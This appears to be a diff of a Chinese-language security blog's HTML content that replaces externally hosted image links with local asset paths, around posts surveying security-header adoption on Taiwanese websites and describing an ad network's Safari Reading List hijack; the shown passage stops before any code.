-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-6dyPHEZZ6RU/UxlujAnSihI/AAAAAAAAAIg/Yq2xC_M4dV8/w1138-h954-no/http-headers-twitter.jpg&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-6dyPHEZZ6RU/UxlujAnSihI/AAAAAAAAAIg/Yq2xC_M4dV8/w1138-h954-no/http-headers-twitter.jpg&quot; alt=&quot;Twitter 的 HTTP reponse&quot; title=&quot;Twitter 的 HTTP reponse&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot; alt=&quot;Twitter 的 HTTP reponse&quot; title=&quot;Twitter 的 HTTP reponse&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;從畫紅線的部分我們可看到 Twitter 在 Cookie 設定了 Secure 與 HttpOnly 這兩個屬性，並且採用了 Strict-Transport-Security、X-Content-Type-Options、X-Frame-Options、X-XSS-Protection 這幾種 headers。&lt;/p&gt;
 
 &lt;p&gt;如果覺得用圖形界面太麻煩，也可以使用 command line 的工具來觀察。下面這張圖片使用 curl 來觀察 Facebook 的 HTTP response 內容：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-wKFIH6kIZDk/UxybqPYO60I/AAAAAAAAAI4/t12_TyJz3cA/w1096-h370-no/http-headers-facebook.jpg&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-wKFIH6kIZDk/UxybqPYO60I/AAAAAAAAAI4/t12_TyJz3cA/w1096-h370-no/http-headers-facebook.jpg&quot; alt=&quot;Facebook 的 HTTP response&quot; title=&quot;Facebook 的 HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot; alt=&quot;Facebook 的 HTTP response&quot; title=&quot;Facebook 的 HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;上述資安相關的-headers-想解決哪些問題&quot;&gt;上述資安相關的 headers 想解決哪些問題？&lt;/h3&gt;
 
@@ -7434,13 +7711,13 @@ CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;這麼簡便的基本防禦方式，理當廣為企業所採用，因此我們針對 &lt;a href=&quot;http://www.alexa.com/topsites/countries/TW&quot;&gt;Alexa Taiwan Top 525&lt;/a&gt; 中挑出 513 個可正常使用的網站（咦？一般不是 Top 500 嗎？我沒騙你，&lt;a href=&quot;http://www.alexa.com/topsites/countries;20/TW&quot;&gt;真的有 525&lt;/a&gt;），調查這些網站是否使用某些常見的 HTTP headers。結果相當令人失望，許多網站都未採用這些 headers。統計數據如下圖：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-EGrtPA75hno/Uxy4jyFD9PI/AAAAAAAAAJc/QDhb3lIDtHw/w369-h201-no/http-headers-statistic-alexa-taiwan.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-EGrtPA75hno/Uxy4jyFD9PI/AAAAAAAAAJc/QDhb3lIDtHw/w369-h201-no/http-headers-statistic-alexa-taiwan.png&quot; alt=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; title=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot; alt=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; title=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;從統計結果中可發現最多人使用的 HttpOnly 只有 21.25%，排名第二的 X-Frame-Options 也只有 7.80%。而且這些數據尚未將 Google、Twitter 等大公司排除，若將前述國際公司排除後，這些比率恐怕會更低。&lt;/p&gt;
 
 &lt;p&gt;不過在上述網站中有不少入口網站、漫畫網站、色情網站，或是公司並非台灣企業，無法反應台灣的使用狀況。恰好在 2012 年 10 月台灣有許多網路服務公司一同成立了 &lt;a href=&quot;http://www.tieataiwan.org/index.php&quot;&gt;TIEA 台灣網路暨電子商務產業發展協會&lt;/a&gt;，目前網站上的&lt;a href=&quot;http://www.tieataiwan.org/member.php&quot;&gt;會員名單&lt;/a&gt;中有 116 個會員，其中不少頗具代表性，正好可觀察這些公司營運的網站是否有採用這些 headers。統計數據如下圖：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-iG4K8bQRP-U/Uxy4vfPsqPI/AAAAAAAAAJo/x66oSzmqwoM/w369-h201-no/http-headers-statistic-tiea.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-iG4K8bQRP-U/Uxy4vfPsqPI/AAAAAAAAAJo/x66oSzmqwoM/w369-h201-no/http-headers-statistic-tiea.png&quot; alt=&quot;HTTP headers statistic of TIEA&quot; title=&quot;HTTP headers statistic of TIEA&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot; alt=&quot;HTTP headers statistic of TIEA&quot; title=&quot;HTTP headers statistic of TIEA&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;很可惜地，所有 headers 的採用率比起上一份數據都還要低。除非公司網站僅使用靜態頁面，網站上沒有任何商業邏輯、帳號、個資，否則應該都要使用合適的 headers 為你的資安防禦工事多築一道牆。&lt;/p&gt;
 
@@ -7463,14 +7740,14 @@ CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;今天我們來談談「廣告顯示手法」。不少廣告商為了要增加廣告的曝光以及點擊率，會使用各種手法強迫使用者顯示廣告。例如彈出式視窗、內嵌廣告、強制跳轉等等。但這樣的手法有什麼好提的呢？今天有一個很特別的案例，讓我們來看看一個網站「&lt;a href=&quot;http://1kkk.com&quot;&gt;1kkk.com 極速漫畫&lt;/a&gt;」。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/4pevslM2QNBVcXug76t7MCziPk5ms9U1gK76fXqLyQ=w839-h634-no&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com&quot; /&gt;&lt;br /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_02.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com&quot; /&gt;&lt;br /&gt;
 這是一個常見的網路漫畫網站，接著點擊進去漫畫頁面。&lt;br /&gt;
 &lt;!-- more --&gt;&lt;br /&gt;
-&lt;img src=&quot;https://lh6.googleusercontent.com/-Q9pSLJQc0Ak/Uxf8YrS0tNI/AAAAAAAAAHQ/lZNQcky2r8k/w839-h634-no/blog_qiyou_hijack_03.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com 漫畫頁面&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com 漫畫頁面&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_03.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com 漫畫頁面&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com 漫畫頁面&quot; /&gt;&lt;br /&gt;
 網站中充斥著煩人的廣告，並且突然一閃而過 Safari 的「閱讀列表」動畫。怎麼會突然這樣呢？讓我們打開「閱讀列表」一探究竟。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-4s9QKuK9ANs/Uxf8ZVeIr-I/AAAAAAAAAHE/C06SoY1VyMI/w262-h525-no/blog_qiyou_hijack_04.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 顯示閱讀側邊欄&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 顯示閱讀側邊欄&quot; /&gt;&lt;br /&gt;
-&lt;img src=&quot;https://lh6.googleusercontent.com/-gWdJCWw41dY/Uxf8ZtMwpuI/AAAAAAAAAHM/m9WbSBbnJSM/w839-h634-no/blog_qiyou_hijack_05.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 閱讀列表被放置廣告 URL&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 閱讀列表被放置廣告 URL&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_04.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 顯示閱讀側邊欄&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 顯示閱讀側邊欄&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_05.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 閱讀列表被放置廣告 URL&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 閱讀列表被放置廣告 URL&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;打開閱讀列表之後，我們赫然發現裡面被加了非常多廣告的頁面！&lt;/p&gt;
 
@@ -7479,7 +7756,7 @@ CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;這是怎麼做到的呢？就是一種利用 JavaScript 控制滑鼠點擊的變形應用。點選「網頁檢閱器」或是「開發者工具」，會看到一段奇怪的 JavaScript 控制滑鼠的點擊行為。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-Ngnx2PsIyNw/Uxf8ZtZtfSI/AAAAAAAAAHU/NEvZLh6a09M/w795-h634-no/blog_qiyou_hijack_06.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 廣告 JavaScript&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 廣告 JavaScript&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_06.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 廣告 JavaScript&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 廣告 JavaScript&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;分析節錄後的 code 如下：&lt;/p&gt;
 
